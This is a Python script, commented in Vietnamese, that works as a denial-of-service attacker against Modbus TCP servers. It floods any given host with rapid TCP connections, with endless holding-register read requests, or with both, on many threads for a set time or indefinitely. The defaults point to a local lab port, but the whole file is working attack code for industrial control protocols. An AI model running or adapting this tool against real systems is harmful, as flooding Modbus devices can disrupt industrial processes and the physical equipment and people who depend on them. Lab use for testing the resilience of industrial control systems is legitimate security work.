import argparse
import logging
import threading
import time
from typing import List

from pymodbus.client import ModbusTcpClient


LOG_FORMAT = "%(asctime)s [%(levelname)s] [ModbusDoS] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)


# Hàm worker mở/đóng nhanh rất nhiều kết nối TCP tới server Modbus để gây quá tải tài nguyên kết nối.
def connection_flood_worker(host: str, port: int, duration: float) -> None:
    """
    Rapidly open and close TCP connections without sending Modbus frames.
    """
    logger.info("Starting TCP connection flood against %s:%d", host, port)
    end_time = time.time() + duration if duration > 0 else float("inf")

    while time.time() < end_time:
        client = ModbusTcpClient(host=host, port=port)
        try:
            client.connect()
        finally:
            client.close()


 # Hàm worker gửi liên tục các request Modbus trên một kết nối để tiêu tốn tài nguyên xử lý của server.
def request_flood_worker(host: str, port: int, unit_id: int) -> None:
    """
    Continuously send Modbus requests as fast as possible on a single connection.
    """
    logger.info("Starting Modbus request flood against %s:%d (unit=%d)", host, port, unit_id)
    while True:
        client = ModbusTcpClient(host=host, port=port)
        try:
            if not client.connect():
                logger.warning("Unable to connect to server, retrying...")
                time.sleep(0.2)
                continue

            while True:
                # Small read request; server has to process each one.
                _ = client.read_holding_registers(address=0, count=1, slave=unit_id)
        except Exception as exc:  # noqa: BLE001
            logger.debug("Request flood worker error: %s", exc)
            time.sleep(0.1)
        finally:
            client.close()


 # Hàm điều phối cấu hình và tạo các luồng worker DoS (TCP flood, Modbus flood hoặc cả hai).
def run_dos(
    host: str,
    port: int,
    mode: str,
    duration: float,
    threads: int,
    unit_id: int,
) -> None:
    workers: List[threading.Thread] = []

    if mode in ("tcp", "both"):
        for i in range(threads):
            t = threading.Thread(
                target=connection_flood_worker,
                args=(host, port, duration),
                daemon=True,
                name=f"tcp-flood-{i}",
            )
            workers.append(t)

    if mode in ("modbus", "both"):
        for i in range(threads):
            t = threading.Thread(
                target=request_flood_worker,
                args=(host, port, unit_id),
                daemon=True,
                name=f"mb-flood-{i}",
            )
            workers.append(t)

    for t in workers:
        t.start()

    if duration > 0 and mode in ("tcp", "both"):
        # Only bound the run for TCP flood; Modbus request flood is infinite.
        logger.info("Running DoS for %.1f seconds...", duration)
        time.sleep(duration)
    else:
        logger.info("Running DoS indefinitely; stop with Ctrl+C.")
        try:
            while True:
                time.sleep(1.0)
        except KeyboardInterrupt:
            logger.info("Stopping DoS attacker.")


 # Hàm main parse tham số dòng lệnh và khởi chạy kịch bản DoS tương ứng.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Modbus DoS attacker (TCP connection flood and/or Modbus request flood).",
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target Modbus server host.")
    parser.add_argument("--port", type=int, default=5020, help="Target Modbus server port.")
    parser.add_argument(
        "--mode",
        choices=["tcp", "modbus", "both"],
        default="both",
        help="Type of DoS to perform.",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help="Duration in seconds for TCP flood (<=0 for infinite).",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=5,
        help="Number of parallel worker threads.",
    )
    parser.add_argument(
        "--unit-id",
        type=int,
        default=1,
        help="Modbus unit id used in request flood.",
    )
    args = parser.parse_args()

    run_dos(
        host=args.host,
        port=args.port,
        mode=args.mode,
        duration=args.duration,
        threads=args.threads,
        unit_id=args.unit_id,
    )


if __name__ == "__main__":
    main()

